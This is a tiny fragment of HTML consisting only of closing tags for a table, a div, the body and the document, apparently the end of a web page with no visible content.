  </table>
</div>
</body>
</html>